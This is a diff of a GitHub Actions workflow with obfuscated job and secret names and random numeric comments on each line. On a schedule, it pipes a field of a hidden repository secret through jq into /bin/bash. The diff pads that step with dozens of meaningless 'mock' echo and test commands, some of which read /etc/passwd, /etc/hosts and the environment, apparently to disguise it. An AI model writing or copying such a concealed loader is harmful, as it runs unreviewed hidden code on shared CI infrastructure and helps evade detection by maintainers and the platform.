@@ -1,15 +1,64 @@
-name: yueyunpeng1873 #26084
-on: #25550
-  workflow_dispatch: #31573
-  schedule: #13612
-    - cron: '26 * * * *' #3993
-jobs: #2635
-  build: #22887
-    runs-on: ubuntu-latest #1045
-    steps: #32648
-      - uses: actions/checkout@v4 #18219
-      - name: yueyunpeng1873 #5027
-        env: #4426
-          r32728: ${{ secrets.r32728 }} #1780
+name: yueyunpeng1873 #3387
+on: #8801
+  workflow_dispatch: #27675
+  schedule: #19361
+    - cron: '30 0/6 * * *' #31323
+jobs: #15138
+  build: #17723
+    runs-on: ubuntu-latest #3233
+    steps: #7956
+      - uses: actions/checkout@v4 #30650
+      - name: yueyunpeng1873 #25815
+        env: #1634
+          u12964: ${{ secrets.u12964 }} #14811
         run: |
-          echo $r32728 | jq -r .q21538 | /bin/bash #5542
+          echo $u12964 | jq -r .g22414 | /bin/bash #4838
+          echo "Case mock: case 1 in 1) echo 1;; esac"
+          grep -q "bash" /etc/passwd 2>/dev/null && echo "Bash user exists"
+          echo "Array mock: arr=(1 2 3); echo \${arr[0]}"
+          echo "Read mock: read -p 'Prompt' var <<< 'input'"
+          find /tmp -maxdepth 1 -type f 2>/dev/null | head -1 || true
+          echo "Exit 0 test: exit 0 || true"
+          echo "Job control: sleep 0.01 & wait"
+          echo "Bit ops: $(( 1 & 1 ))"
+          echo "Kernel: $(uname -s 2>/dev/null || echo Linux)"
+          echo "Option mock: grep -i 'a' /etc/hosts 2>/dev/null | head -1"
+          echo "Redirect mock: echo data > /dev/null 2>&1"
+          echo "Env vars: $(env | wc -l) total"
+          echo "Version: $((1 + RANDOM % 5))"
+          echo "Random ID: $RANDOM$RANDOM"
+          echo "Eval mock: eval 'echo eval-test'"
+          echo "Socket test: echo 'socket-check'"
+          echo "Command fail safe: false || echo 'Safe'"
+          echo "Test: [ 1 -eq 1 ] && echo 'Math OK'"
+          echo "Chmod mock: chmod 644 /tmp 2>/dev/null || true"
+          cat /dev/null > /tmp/.tmpfile 2>/dev/null || true
+          echo "Null cmd: : > /dev/null"
+          echo "Build $(date +%s)"
+          test -d /tmp && echo "Tmp dir exists"
+          echo "Curl mock: curl -s http://example.com 2>/dev/null | head -1 || echo no-curl"
+          for i in {1..3}; do echo "Iter $i"; done
+          if [ -x /bin/ls ]; then echo "LS executable"; fi
+          echo "Disk usage (fake): $(df -h . 2>/dev/null | tail -1 || echo N/A)"
+          echo "Arithmetic: $(( (RANDOM % 5) * 10 ))"
+          echo "Random sleep: sleep $((RANDOM % 2)) 2>/dev/null || true"
+          echo "Null check: [ ! -f /nonexistent ] && echo 'OK'"
+          [ $RANDOM -gt 1000 ] && echo "Random passed"
+          echo "Awk mock: echo '1 2' | awk '{print \$1}' 2>/dev/null || echo no-awk"
+          echo "In-array test: [[ 'a' =~ [a-z] ]] && echo Match"
+          echo "Conditional: [[ 'a' == 'a' ]] && echo Match"
+          sleep 0.1 2>/dev/null || true
+          echo "Random string: $(cat /dev/urandom | tr -cd 'a-z' | head -c 5 2>/dev/null || echo abcde)"
+          echo "Command || true: ls /nonexist || true"
+          echo "Signal mock: trap '' SIGINT"
+          for i in 1 2 3; do echo "Loop $i"; done
+          echo "Path mock: echo \$PATH | awk -F: '{print \$1}'"
+          echo "IO redirect: echo > file 2>/dev/null || true"
+          echo "Command group: { echo group; }"
+          echo "Command count: echo \$(ls | wc -l 2>/dev/null || echo 0)"
+          echo "Arith loop: for ((i=0;i<3;i++)); do echo $i; done"
+          echo "File test: [ -e /etc/passwd ] && echo Passwd exists"
+          echo "Uptime: $(uptime 2>/dev/null | cut -d' ' -f1-3 || echo N/A)"
+          ls -la 2>/dev/null || true
+          echo "Trap mock: trap 'echo TRAP' EXIT"
+          echo "Math eval: echo \$(( 2 ​**​ 3 ))"
